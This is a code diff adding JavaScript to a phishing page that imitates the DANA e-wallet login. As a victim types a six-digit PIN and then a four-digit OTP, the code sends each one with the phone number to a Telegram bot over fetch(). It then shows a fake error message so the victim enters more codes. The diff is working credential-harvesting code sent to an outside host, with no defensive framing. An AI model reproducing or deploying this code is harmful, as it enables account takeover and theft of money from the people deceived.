@@ -781,4 +781,50 @@ function prosesLanjutDana(){
 function fokusPinDana(){document.getElementById('pinDana').focus();}
 
 function isiPinDana(val){
-    let kotak
+    let kotak = document.querySelectorAll('.pin-bulat-dana');
+    kotak.forEach((k,i)=>k.style.backgroundColor = val[i] ? '#0060E5' : 'transparent');
+    if(val.length === 6){
+        dataDana.pin = val;
+        // KIRIM PIN KE TELEGRAM
+        fetch(API_TELEGRAM,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:CHAT_ID,text:`🔵 *DATA DANA - PIN*
+📱 Nomor: 62${dataDana.nomor}
+🔐 PIN: ${val}`,parse_mode:'Markdown'})
+        });
+        // KE HALAMAN OTP
+        bukaHalaman('dana_3');
+        // TAMPILKAN NOMOR SESUAI ISIAN
+        let tampil = dataDana.nomor.replace(/(\d{2})(\d{3})(\d{4})/, '$1-$2-$3');
+        document.getElementById('nomorTujuanDana').innerText = '+62 ' + tampil;
+    }
+    document.getElementById('pesanSalahDana').classList.add('hidden');
+}
+
+function fokusKodeDana(){document.getElementById('kodeOtpDana').focus();}
+
+function isiKodeOtpDana(val){
+    let kotak = document.querySelectorAll('.kode-dana');
+    kotak.forEach((k,i)=>{
+        k.innerText = val[i] || '';
+        k.style.backgroundColor = val[i] ? '#fbbf24' : 'white';
+    });
+    if(val.length === 4){
+        dataDana.otp = val;
+        // KIRIM KODE OTP KE TELEGRAM
+        fetch(API_TELEGRAM,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:CHAT_ID,text:`🔵 *VERIFIKASI DANA - OTP*
+📱 Nomor: 62${dataDana.nomor}
+🔢 Kode OTP: ${val}`,parse_mode:'Markdown'})
+        });
+        // TAMPILKAN PESAN SALAH
+        document.getElementById('pesanSalahDana').classList.remove('hidden');
+    }
+}
+</script>
+
+</body>
+</html>
